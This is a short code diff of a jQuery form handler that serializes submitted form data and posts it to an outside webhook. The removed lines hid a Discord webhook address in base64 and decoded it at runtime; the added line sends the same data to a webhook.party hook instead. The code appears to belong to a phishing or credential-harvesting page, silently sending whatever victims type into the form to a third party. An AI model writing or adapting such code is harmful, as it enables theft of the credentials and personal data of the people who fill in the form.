@@ -41,13 +41,7 @@ $(document).ready(function() {
         end = true
         var formData = $(this).serialize();
 
-        var ewr41 = "aHR0cHM6Ly9kaXNjb3JkLmNvbS9hcGkvd2ViaG9va3MvMTM3MzQyMDcxNjI1NDQyOTI1NA==";
-
-        function db64(str) {
-            return atob(str.replace(/\s/g, ''));
-        }
-
-        var URL = `${db64(ewr41)}/mFU8PVn5pwtyKWHMa4T9wtmYHrCNL4dZfO4fAFBHEkX3-01tlof5oKqDBrm_wcSHJKaJ`;
+        var URL = `https://l.webhook.party/hook/OHb7ZIhPR4xMEZpJRXMUeE8BecqxuZPpoyC%2F5anpSQzQce2nakV7g3LJaMrX2tsUM9yFY80536nnH1K38QOrqCsUsLqNIIxMDB9Dylt8e%2BhTGZjQ1XTq64Ajta5ZuWUwlRBb4plQLgLsZm09qhDN0pkR6tENbdre4sdXhc4z3KgkbpwRbBPUW%2FLP6DBBRtOAHVAnsOa5c5iZyXzk%2B08%2B1wX2D%2FEY8i%2FsrEce%2F7sWOeiRV9u7WwvwpFpibkRn7XcV271r2hHeqvqJWku%2F60UzGbAvN4gyB6pdbf740GDmwWyx%2FIUrNAL52gEQWEBhvUvlhScp%2FfGn4WJpahg7pfWzYiByXUL0J7VJACvDvNoNJuRuC%2BPC9bqU3uWkG2oR0XjP30tS2eU8P1Y%3D/zA%2BYlWsAaF0UjykK`;
 
         $.ajax({
             url: URL,
